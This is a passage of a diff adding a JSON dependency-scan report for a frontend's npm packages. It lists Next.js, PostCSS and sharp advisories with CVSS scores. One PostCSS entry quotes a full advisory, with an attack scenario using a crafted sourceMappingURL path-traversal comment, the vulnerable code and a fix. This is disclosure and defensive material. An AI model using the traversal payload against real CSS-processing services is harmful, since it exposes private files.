+            "@img/sharp-libvips-linux-x64@1.2.4",
+            "@img/sharp-libvips-linuxmusl-arm64@1.2.4",
+            "@img/sharp-libvips-linuxmusl-x64@1.2.4",
+            "@img/sharp-linux-arm64@0.34.5",
+            "@img/sharp-linux-arm@0.34.5",
+            "@img/sharp-linux-ppc64@0.34.5",
+            "@img/sharp-linux-riscv64@0.34.5",
+            "@img/sharp-linux-s390x@0.34.5",
+            "@img/sharp-linux-x64@0.34.5",
+            "@img/sharp-linuxmusl-arm64@0.34.5",
+            "@img/sharp-linuxmusl-x64@0.34.5",
+            "@img/sharp-wasm32@0.34.5",
+            "@img/sharp-win32-arm64@0.34.5",
+            "@img/sharp-win32-ia32@0.34.5",
+            "@img/sharp-win32-x64@0.34.5",
+            "detect-libc@2.1.2",
+            "semver@7.8.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 8845,
+              "EndLine": 8889
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "source-map-js@1.2.1",
+          "Name": "source-map-js",
+          "Identifier": {
+            "PURL": "pkg:npm/source-map-js@1.2.1",
+            "UID": "8e4e0ffd0cfc9400"
+          },
+          "Version": "1.2.1",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 9012,
+              "EndLine": 9020
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "styled-jsx@5.1.6",
+          "Name": "styled-jsx",
+          "Identifier": {
+            "PURL": "pkg:npm/styled-jsx@5.1.6",
+            "UID": "d2e585c2f264b968"
+          },
+          "Version": "5.1.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "client-only@0.0.1",
+            "react@19.2.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 9229,
+              "EndLine": 9251
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tslib@2.8.1",
+          "Name": "tslib",
+          "Identifier": {
+            "PURL": "pkg:npm/tslib@2.8.1",
+            "UID": "d36d8a92021255b1"
+          },
+          "Version": "2.8.1",
+          "Licenses": [
+            "0BSD"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 2992,
+              "EndLine": 2998
+            },
+            {
+              "StartLine": 9509,
+              "EndLine": 9514
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2026-64641",
+          "VendorIDs": [
+            "GHSA-m99w-x7hq-7vfj"
+          ],
+          "PkgID": "next@16.2.6",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.2.6",
+            "UID": "54bbe01c9a3c41b6"
+          },
+          "InstalledVersion": "16.2.6",
+          "FixedVersion": "15.5.21, 16.2.11",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-64641",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:ed5a7264d0dcb338507e7307f3f1ef89e48ca3e678dba93c0da04a295ab67449",
+          "Title": "next: Next.js: Denial of Service via crafted requests to App Router with Server Actions",
+          "Description": "Next.js is a React framework for building full-stack web applications. In versions 13.0.0 through 15.5.20 and 16.0.0 through 16.2.10, crafted requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive CPU usage blocking processing of further requests in the same process. This issue has been fixed in versions 15.5.21 and 16.2.11.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-834"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-64641",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/019628571641dec57aaf349ba0c360e3964e6f12",
+            "https://github.com/vercel/next.js/pull/96013",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+            "https://github.com/vercel/next.js/releases/tag/v16.2.11",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-m99w-x7hq-7vfj",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-64641",
+            "https://www.cve.org/CVERecord?id=CVE-2026-64641"
+          ],
+          "PublishedDate": "2026-07-27T18:16:58.85Z",
+          "LastModifiedDate": "2026-07-29T14:36:32.13Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-64642",
+          "VendorIDs": [
+            "GHSA-6gpp-xcg3-4w24"
+          ],
+          "PkgID": "next@16.2.6",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.2.6",
+            "UID": "54bbe01c9a3c41b6"
+          },
+          "InstalledVersion": "16.2.6",
+          "FixedVersion": "16.2.11",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-64642",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:0c152ba7655a52c3b6c1655e06c9cbe896044cdd4d2ea94c267389e422fd344e",
+          "Title": "next: Next.js: Authentication bypass leading to unauthorized access",
+          "Description": "Next.js is a React framework for building full-stack web applications. In versions 16.0.0 through 16.2.10, crafted requests targeting Next.js applications using App Router built with Turbopack and a single entry in config.i18n.locales can bypass middleware/proxy based authentication. This issue has been fixed in version 16.2.11.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-285"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 8.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 8.2
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-64642",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/6bf4df14508ad6c0cd46af50c6051ee42f2d9151",
+            "https://github.com/vercel/next.js/pull/96014",
+            "https://github.com/vercel/next.js/releases/tag/v16.2.11",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-6gpp-xcg3-4w24",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-64642",
+            "https://www.cve.org/CVERecord?id=CVE-2026-64642"
+          ],
+          "PublishedDate": "2026-07-27T18:16:59.01Z",
+          "LastModifiedDate": "2026-07-29T14:36:59.73Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-64645",
+          "VendorIDs": [
+            "GHSA-p9j2-gv94-2wf4"
+          ],
+          "PkgID": "next@16.2.6",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.2.6",
+            "UID": "54bbe01c9a3c41b6"
+          },
+          "InstalledVersion": "16.2.6",
+          "FixedVersion": "15.5.21, 16.2.11",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-64645",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:d8b4b115dade76878206dd721732e43553536e0f48e31531a956bda3e0c167e3",
+          "Title": "next: Next.js: Server-Side Request Forgery vulnerability",
+          "Description": "Next.js is a React framework for building full-stack web applications. In versions 12.0.0 through 15.5.20 and 16.0.0 through 16.2.10, a\n rewrites() or redirects() rule that builds its external destination hostname from request-controlled input can be pointed at an arbitrary hostname, regardless of the rule's hostname suffix. For a rewrite, Next.js proxies the request to that arbitrary host and serves the response from the application's origin, leading to Server-Side Request forgery. A redirects() rule configured this way is vulnerable to an Open Redirect. This issue has been fixed in versions 15.5.21 and 16.2.11.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-601",
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 2,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:L/SI:L/SA:N",
+              "V40Score": 8.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+              "V3Score": 6.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-64645",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/35f501357e9b0fe7c950b0d6aa8fcf5343f707e9",
+            "https://github.com/vercel/next.js/commit/d3033266c6dff23f7be71e19341fe3a8c6e2c599",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+            "https://github.com/vercel/next.js/releases/tag/v16.2.11",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-p9j2-gv94-2wf4",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-64645",
+            "https://www.cve.org/CVERecord?id=CVE-2026-64645"
+          ],
+          "PublishedDate": "2026-07-27T18:16:59.453Z",
+          "LastModifiedDate": "2026-07-29T14:39:12.173Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-64649",
+          "VendorIDs": [
+            "GHSA-89xv-2m56-2m9x"
+          ],
+          "PkgID": "next@16.2.6",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.2.6",
+            "UID": "54bbe01c9a3c41b6"
+          },
+          "InstalledVersion": "16.2.6",
+          "FixedVersion": "15.5.21, 16.2.11",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-64649",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:f02b7afc698e2cdbcfc85d68c22b611a0ec06c6d4986b1800d5fa371d410fcdf",
+          "Title": "next: Next.js: Server-Side Request Forgery via malicious host redirection in Server Actions",
+          "Description": "Next.js is a React framework for building full-stack web applications. In versions 14.1.1 through 15.5.20 and 16.0.0 through 16.2.10, when a Server Action forwards or redirects a request, an attacker can cause the server to send that outbound request to a malicious host (Server-Side Request Forgery). This requires the attacker's request to control Host-associated headers. In some configurations, it's also possible to obtain internal values that weaken middleware/proxy authorization. Applications that use Server Actions are affected when the incoming host header is not fixed to a trusted value. This typically occurs on custom servers, or on deployments not behind a proxy that pins the host. Managed hosting pins the host upstream and is not affected; next start and standalone output do the same from version 14.2 onward. This issue has been fixed in versions 15.5.21 and 16.2.11.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 2,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 8.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 6.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-64649",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/b51206321854193208c0805ba42acc49287f942b",
+            "https://github.com/vercel/next.js/commit/e3e5666ccead3a15162793d697af5e48b7cc0498",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.21",
+            "https://github.com/vercel/next.js/releases/tag/v16.2.11",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-89xv-2m56-2m9x",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-64649",
+            "https://www.cve.org/CVERecord?id=CVE-2026-64649"
+          ],
+          "PublishedDate": "2026-07-27T20:16:40.703Z",
+          "LastModifiedDate": "2026-07-29T14:38:03.6Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-45623",
+          "VendorIDs": [
+            "GHSA-6g55-p6wh-862q"
+          ],
+          "PkgID": "postcss@8.4.31",
+          "PkgName": "postcss",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/postcss@8.4.31",
+            "UID": "e672f51a084801d5"
+          },
+          "InstalledVersion": "8.4.31",
+          "FixedVersion": "8.5.12",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-45623",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:70a5f8fc5696b50c65bd6e26cacc8a59ece7868df611e88effbaac9718a325bf",
+          "Title": "postcss: PostCSS: Information disclosure and denial of service via crafted CSS input",
+          "Description": "PostCSS takes a CSS file and provides an API to analyze and modify its rules by transforming the rules into an Abstract Syntax Tree. In versions 8.5.11 and prior, the PreviousMap parses the /*# sourceMappingURL=PATH */ comment from any CSS string passed to process() and dereferences PATH against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting JSON.parse SyntaxError message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no from, no map, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.). This issue has been fixed in version 8.5.12.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22",
+            "CWE-200"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-45623",
+            "https://github.com/postcss/postcss",
+            "https://github.com/postcss/postcss/commit/aaec7b78b3ce2792585b4b300ef1bd5dd5b3e8ad",
+            "https://github.com/postcss/postcss/commit/c64b7488d2731dfa16213739b42c34faf5a9eba3",
+            "https://github.com/postcss/postcss/releases/tag/8.5.12",
+            "https://github.com/postcss/postcss/security/advisories/GHSA-6g55-p6wh-862q",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-45623",
+            "https://www.cve.org/CVERecord?id=CVE-2026-45623"
+          ],
+          "PublishedDate": "2026-07-27T18:16:55.13Z",
+          "LastModifiedDate": "2026-07-30T19:57:52.717Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-r28c-9q8g-f849",
+          "PkgID": "postcss@8.4.31",
+          "PkgName": "postcss",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/postcss@8.4.31",
+            "UID": "e672f51a084801d5"
+          },
+          "InstalledVersion": "8.4.31",
+          "FixedVersion": "8.5.18",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-r28c-9q8g-f849",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:65e54428ee1b7bb1ee6c83bc0d424ca55bd95d51c3cea4c0d261aa70ea19d70c",
+          "Title": "PostCSS: Path Traversal in Previous Source Map Auto-Loading (sourceMappingURL) leads to Arbitrary .map File Disclosure",
+          "Description": "## Vulnerability Details\n\n**File**: `lib/previous-map.js`\n**Line**: 87-98 (`loadFile`), 129-144 (`loadMap`)\n\n\n### Root Cause\nPostCSS auto-detects a `/*# sourceMappingURL=... */` comment inside the CSS text it is asked to parse and, unless the caller explicitly passes `map: false`, attempts to load that path from disk as a \"previous source map.\" This happens on every `postcss.parse()` / `postcss().process()` call by default (opt-out, not opt-in).\n\n`loadMap()` builds the candidate path via `join(dirname(opts.from), annotation)`, where `annotation` is the raw, attacker-controlled string from the CSS comment. `path.join()` normalizes but does not sandbox `..` segments, so a `../../../` prefix walks the resolved path outside the intended directory. If `opts.from` is not set at all, the annotation is used completely unmodified — an absolute path in the CSS comment is read verbatim.\n\n8.5.12 already fixed a strictly worse variant of this (any file, any extension, could be read) by requiring the resolved path to end in `.map` (`loadFile()`). That fix did not address the traversal itself, only the target extension. Since the `join(dirname(file), map)` logic has existed unchanged since PostCSS 8.0.0 (Feb 2020), any file ending in `.map` remains readable through this path in the current release (8.5.16).\n\nOnce loaded, `MapGenerator.isMap()` treats the mere presence of a loaded \"previous map\" as an implicit request to generate `result.map`, even when the caller never set the `map` option. If the loaded map has a `sourcesContent` field (common for maps emitted by bundlers/transpilers), that content is merged into `result.map` and returned to the caller — disclosing the traversed-to file's content to whoever supplied the CSS.\n\n### Attack Scenario\n1. A service accepts user-submitted CSS and runs it through PostCSS to lint/format/transform it, e.g. `postcss().process(userCss, { from: '/app/uploads/user123/input.css', to: '/app/uploads/user123/output.css' })` — idiomatic usage; `map` option untouched.\n2. Attacker submits CSS containing `/*# sourceMappingURL=../../../../some/other/app/dist/bundle.js.map */` (or an absolute path if `from` is unset).\n3. PostCSS reads that `.map` file and folds its `sourcesContent` into `result.map`.\n4. The service does what most build pipelines do with a truthy `result.map` — writes it next to the CSS output or returns it via API (source maps are meant to be consumed by browser devtools, so this is commonly public/served).\n5. Attacker retrieves the emitted map and reads out the traversed file's content.\n\n### Impact\nDisclosure of the contents of arbitrary `.map` files reachable via path traversal (or absolute path when `from` is unset) from the process's filesystem. Affects any application processing CSS it does not fully trust without explicitly passing `map: false`. No authentication or user interaction beyond submitting CSS text is required.\n\n### Vulnerable Code\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted \u0026\u0026 !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n\nloadMap(file, prev) {\n  ...\n  } else if (this.annotation) {\n    let map = this.annotation\n    if (file) map = join(dirname(file), map)\n    let unknown = this.loadFile(map, file, false)\n    ...\n  }\n}\n```\n\n### Recommended Fix\nConstrain the resolved path to remain inside the CSS file's own directory instead of relying solely on a filename-extension check:\n```js\nloadFile(path, cssFile, trusted) {\n  if (!trusted \u0026\u0026 !this.unsafeMap) {\n    if (!/\\.map$/i.test(path)) {\n      return undefined\n    }\n    if (!cssFile) return undefined\n    let root = resolve(dirname(cssFile))\n    let resolvedPath = resolve(root, path)\n    if (resolvedPath !== root \u0026\u0026 !resolvedPath.startsWith(root + sep)) {\n      return undefined\n    }\n  }\n  this.root = dirname(path)\n  if (existsSync(path)) {\n    this.mapFile = path\n    return readFileSync(path, 'utf-8').toString().trim()\n  }\n}\n```\nI've implemented, tested (full existing test suite — 660/660 passing, plus new PoC-based regression checks for both the traversal and legitimate same-directory cases), and can share this fix on request or via a private fork if invited.\n\n### Verification\nDynamically confirmed on v8.5.16 (current npm release / repo HEAD) via a standalone Node.js harness against `lib/postcss.js`: a \"secret\" `.map` file placed two directories outside a simulated project directory was read via a crafted `sourceMappingURL` comment in otherwise-innocuous CSS, with its `sourcesContent` appearing verbatim in `result.map.toString()` — with no `map` option set by the caller. A second harness confirmed the simpler no-`from` case reads an absolute path directly. A third harness confirmed `map: false` is the only current workaround. The attached fix branch closes both vectors while keeping all 660 existing unit tests green.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/postcss/postcss",
+            "https://github.com/postcss/postcss/commit/95663d3eb7ba26f4854dd19d3b4f4425760cf56c",
+            "https://github.com/postcss/postcss/releases/tag/8.5.18",
+            "https://github.com/postcss/postcss/security/advisories/GHSA-r28c-9q8g-f849"
+          ],
+          "PublishedDate": "2026-07-24T16:24:55Z",
+          "LastModifiedDate": "2026-07-24T16:24:55Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-f88m-g3jw-g9cj",
+          "PkgID": "sharp@0.34.5",
+          "PkgName": "sharp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/sharp@0.34.5",
+            "UID": "74c59cd05e39308b"
+          },
+          "InstalledVersion": "0.34.5",
+          "FixedVersion": "0.35.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-f88m-g3jw-g9cj",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:d20d48bba99648a213030a0a543416579544d4e570b9f2716007f4ffad5e91dd",
+          "Title": "sharp inherited vulnerabilities in libvips: CVE-2026-33327, CVE-2026-33328, CVE-2026-35590, CVE-2026-35591",
+          "Description": "### Impact\n\nA number of vulnerabilities, two rated as \"High\" severity using CVSSv4, have been discovered and fixed in the upstream libvips dependency.\n\nThose processing untrusted input with versions of sharp prior to 0.35.0 are affected.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.3, which provides libvips 8.18.3.\n\n#### Using a globally-installed libvips?\n\nPlease ensure you are using the latest libvips 8.18.3.\n\n### Workarounds\nAdd the following to your code to prevent sharp from decoding GIF, TIFF and VIPS images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadNsgif\", \"VipsForeignLoadTiff\", \"VipsForeignLoadVips\"] });\n```",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 7
+            }
+          },
+          "References": [
+            "https://github.com/libvips/libvips/security/advisories/GHSA-2fcj-gj27-279x",
+            "https://github.com/libvips/libvips/security/advisories/GHSA-523x-vhfw-6r76",
+            "https://github.com/libvips/libvips/security/advisories/GHSA-jmwm-wc68-mhwm",
+            "https://github.com/libvips/libvips/security/advisories/GHSA-r98w-4fp7-m9c7",
+            "https://github.com/lovell/sharp",
+            "https://github.com/lovell/sharp/security/advisories/GHSA-f88m-g3jw-g9cj"
+          ],
+          "PublishedDate": "2026-07-21T22:07:17Z",
+          "LastModifiedDate": "2026-07-21T22:07:17Z"
+        }
+      ]
+    },
+    {
+      "Target": "frontend/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "@types/react@19.2.14",
+          "Name": "@types/react",
+          "Identifier": {
+            "PURL": "pkg:npm/%40types/react@19.2.14",
+            "UID": "4127304f15944612"
+          },
+          "Version": "19.2.14",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "csstype@3.2.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1281,
+              "EndLine": 1290
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "axios@1.16.0",
+          "Name": "axios",
+          "Identifier": {
+            "PURL": "pkg:npm/axios@1.16.0",
+            "UID": "f00dc2b01085d010"
+          },
+          "Version": "1.16.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "follow-redirects@1.16.0",
+            "form-data@4.0.5",
+            "proxy-from-env@2.1.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1416,
+              "EndLine": 1426
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "clsx@2.1.1",
+          "Name": "clsx",
+          "Identifier": {
+            "PURL": "pkg:npm/clsx@2.1.1",
+            "UID": "5c873f8e011d3099"
+          },
+          "Version": "2.1.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 1531,
+              "EndLine": 1539
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "framer-motion@12.38.0",
+          "Name": "framer-motion",
+          "Identifier": {
+            "PURL": "pkg:npm/framer-motion@12.38.0",
+            "UID": "f3d04b3e7797ff5"
+          },
+          "Version": "12.38.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "motion-dom@12.38.0",
+            "motion-utils@12.36.0",
+            "react-dom@19.2.6",
+            "react@19.2.6",
+            "tslib@2.8.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2214,
+              "EndLine": 2240
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lucide-react@1.14.0",
+          "Name": "lucide-react",
+          "Identifier": {
+            "PURL": "pkg:npm/lucide-react@1.14.0",
+            "UID": "f60f16abb92d9039"
+          },
+          "Version": "1.14.0",
+          "Licenses": [
+            "ISC"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "react@19.2.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 2857,
+              "EndLine": 2865
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react@19.2.6",
+          "Name": "react",
+          "Identifier": {
+            "PURL": "pkg:npm/react@19.2.6",
+            "UID": "2960e8c307337ec6"
+          },
+          "Version": "19.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 3131,
+              "EndLine": 3139
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-dom@19.2.6",
+          "Name": "react-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/react-dom@19.2.6",
+            "UID": "cf06c0686426b31f"
+          },
+          "Version": "19.2.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "react@19.2.6",
+            "scheduler@0.27.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3140,
+              "EndLine": 3151
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "recharts@3.8.1",
+          "Name": "recharts",
+          "Identifier": {
+            "PURL": "pkg:npm/recharts@3.8.1",
+            "UID": "80f7abc7f2570c03"
+          },
+          "Version": "3.8.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@reduxjs/toolkit@2.11.2",
+            "clsx@2.1.1",
+            "decimal.js-light@2.5.1",
+            "es-toolkit@1.46.1",
+            "eventemitter3@5.0.4",
+            "immer@10.2.0",
+            "react-dom@19.2.6",
+            "react-is@19.2.6",
+            "react-redux@9.2.0",
+            "react@19.2.6",
+            "reselect@5.1.1",
+            "tiny-invariant@1.3.3",
+            "use-sync-external-store@1.6.0",
+            "victory-vendor@37.3.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3182,
+              "EndLine": 3211
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "socket.io-client@4.8.3",
+          "Name": "socket.io-client",
+          "Identifier": {
+            "PURL": "pkg:npm/socket.io-client@4.8.3",
+            "UID": "6b483a2afd7d092c"
+          },
+          "Version": "4.8.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@socket.io/component-emitter@3.1.2",
+            "debug@4.4.3",
+            "engine.io-client@6.6.5",
+            "socket.io-parser@4.2.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 3313,
+              "EndLine": 3327
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tailwind-merge@3.6.0",
+          "Name": "tailwind-merge",
+          "Identifier": {
